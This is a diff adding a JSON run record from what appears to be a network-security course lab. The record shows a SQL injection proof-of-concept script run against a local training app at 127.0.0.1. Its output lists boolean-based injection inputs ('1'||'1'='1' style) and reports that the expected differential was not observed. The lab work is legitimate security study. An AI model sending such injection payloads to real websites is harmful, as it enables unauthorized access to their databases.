@@ -1,0 +1,24 @@
+{
+  "cmd": [
+    "C:\\Users\\12396\\.dsh\\dsh-runtimes\\dsh-primary-runtime\\dependencies\\python\\python.exe",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v1\\SQLI-003__1.py",
+    "--base-url",
+    "http://127.0.0.1:9081",
+    "--path",
+    "/Less-25/?id=1"
+  ],
+  "started_at": "2026-10-20T14:41:49+08:00",
+  "returncode": 2,
+  "elapsed_seconds": 0.099,
+  "stdout": "[baseline] row_returned   \r\n[boolean_true] row_returned   \r\n[boolean_false] row_returned   \r\nrequests sent: id=1, id=1'||'1'='1, id=1'||'1'='2\r\nexpected differential observed: False\r\n",
+  "stderr": "",
+  "cohort": "v1",
+  "stem": "SQLI-003__1",
+  "poc": "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v1\\SQLI-003__1.py",
+  "args_redacted": [
+    "--base-url",
+    "http://127.0.0.1:9081",
+    "--path",
+    "/Less-25/?id=1"
+  ]
+}
